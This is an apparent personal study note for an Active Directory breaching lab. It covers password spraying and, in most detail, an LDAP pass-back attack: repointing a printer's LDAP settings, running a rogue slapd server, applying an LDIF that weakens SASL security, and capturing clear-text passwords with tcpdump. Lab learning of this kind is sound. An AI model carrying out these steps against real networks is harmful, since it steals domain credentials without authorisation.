
## Initial steps

add dns address for the root DC to the ipv4 settings in advanced network configuration

- Network Manager -> Advanced Network Configuration -> Your Connection -> IPv4 Settings
- Set your DNS IP here to the IP for THMDC in the network diagram above  
- Add another DNS such as 1.1.1.1 or similar to ensure you still have internet access
- Run `sudo systemctl restart NetworkManager` and test your DNS similar to the steps above

## Gaining Credentials

OSINT - stackoverflow, github, havibeenpwned, dehashed

Phishing

## NTLM Authentication

bruteforce attacks/password spraying

AD will user lock out on too many failed attempts so we use password spraying
password-spraying - one password tested with an email list


## LDAP Bind Credentials

with ldap the application directly verifies user credentials
ldap is popular with third party non-microsoft applications that integrate with AD

### LDAP pass-back attacks

LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified like a printers /settings in the web portal.

we change the ip of the ldap server in the network device settings (like a printer) to our own server in order to get a network device to attempt to authenticate through ldap with our machine to get the configuration or password details of the ldap.


#### Running Rogue ldap server

test ldap with nc -nvlp 389, check repsonse and then attempts steps below

1. `sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
2. `sudo dpkg-reconfigure -p low slapd`
	1. no - to omit
	2. root domain on dns 
	3. root domain of dns
	4. password
	5. password
	6. mdb (if presented)
	7. no to purged
	8. yes to move old database
4. create a new ldif file (below) to ensure the ldap server is vulnerable so we can recieve password in clear text - it downgrades the security mechanisms for authorization
5. patch the service `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
6. `ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanismns` verify patch
7. `sudo tcpdump -SX -i interface_name tcp port 389` - get clear text password

#### ldif file (copy and past into olcSaslSecProps.ldif)
\#olcSaslSecProps.ldif 
dn: cn=config 
replace: olcSaslSecProps 
olcSaslSecProps: noanonymous,minssf=0,passcred
